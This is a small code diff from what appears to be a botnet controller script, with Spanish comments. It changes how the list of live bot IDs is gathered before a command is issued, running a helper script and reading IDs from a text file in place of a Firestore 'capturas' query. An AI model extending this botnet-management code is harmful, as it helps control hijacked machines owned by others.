@@ -13,11 +13,12 @@ now = datetime.now()
 dt_string = now.strftime("%d-%m-%Y %H:%M:%S")
 
 # Escribe una orden para la botnet
+os.system("python3 botsVivos.py")
 lista = []
-docs = firestore_db.collection(u'capturas').where(u'Bot_ID', u'!=', "").stream()
-for doc in docs:
-    if(not(doc.get("Bot_ID") in lista)):
-        lista.append(doc.get("Bot_ID"))
+with open ("availableBots.txt", "r") as myfile:
+    lines = myfile.readlines()
+    newline = lines[0].replace(" \n","")
+    lista = newline.split(";")
 
 print(lista)
 
